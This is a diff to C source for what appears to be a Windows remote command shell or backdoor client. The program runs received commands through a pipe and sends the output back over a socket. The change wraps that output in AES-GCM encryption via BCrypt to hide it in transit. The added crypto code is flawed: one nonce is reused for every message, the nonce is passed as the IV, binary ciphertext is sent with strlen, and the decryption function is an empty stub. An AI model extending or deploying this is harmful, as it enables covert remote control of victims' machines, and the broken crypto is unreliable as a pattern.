@@ -179,16 +179,23 @@ int main()
             {
                 // Command failed to execute
                 const char *error_msg = "ERROR: Failed to execute command\n";
-                if (send_all(soc, (char *)error_msg, (int)strlen(error_msg), 0) <= 0)
+                if (send_all(soc, (char *)error_msg, (int)strlen(error_msg)) <= 0)
                     return 1;
             }
             else
             {
+                int ciphertext_len = 0;
+                BYTE tag[16];
                 char buf[512];
+                char result_buf[512];
                 int send_result;
                 while (fgets(buf, sizeof(buf), pipe) != NULL)
                 {
-                    send_result = send_all(soc, buf, (int)strlen(buf));
+                    encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
+                                    result_buf, sizeof(result_buf), &ciphertext_len,
+                                    tag, sizeof(tag));
+
+                    send_result = send_all(soc, result_buf, (int)strlen(result_buf));
                     // send_result = send(soc, buf, (int)strlen(buf), 0);
                     if (send_result <= 0)
                     {
@@ -258,4 +265,51 @@ int send_all(SOCKET sock, char *buff, int len)
         total += sent;
     }
     return total;
+}
+
+int encrypt_message(BCRYPT_KEY_HANDLE aesKey, const BYTE *nonce, int nonce_len, const BYTE *plaintext, int plaintext_len, BYTE *ciphertext, int ciphertext_buffer_len, int *ciphertext_len, BYTE *tag, int tag_len)
+{
+
+    // Generate new nonce (need to create new nonce for each send)
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (PUCHAR)nonce;
+    authInfo.cbNonce = nonce_len;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = tag_len;
+
+    ULONG resultlen = 0;
+
+    // encrypt message
+    NTSTATUS status = BCryptEncrypt(
+        aesKey,
+        (PUCHAR)plaintext,
+        plaintext_len,
+        &authInfo,
+        (PUCHAR)nonce,
+        nonce_len,
+        ciphertext,
+        ciphertext_buffer_len,
+        &resultlen,
+        0);
+
+    if (!BCRYPT_SUCCESS(status))
+        return 0;
+
+    *ciphertext_len = (int)resultlen;
+    return 1;
+}
+
+void decrypt_message(
+    BCRYPT_KEY_HANDLE aesKey,
+    const BYTE *nonce,
+    int nonce_len,
+    const BYTE *plaintext,
+    int plaintext_len,
+    BYTE *ciphertext,
+    int ciphertext_buffer_len,
+    int *ciphertext_len,
+    BYTE *tag,
+    int tag_len)
+{
 }
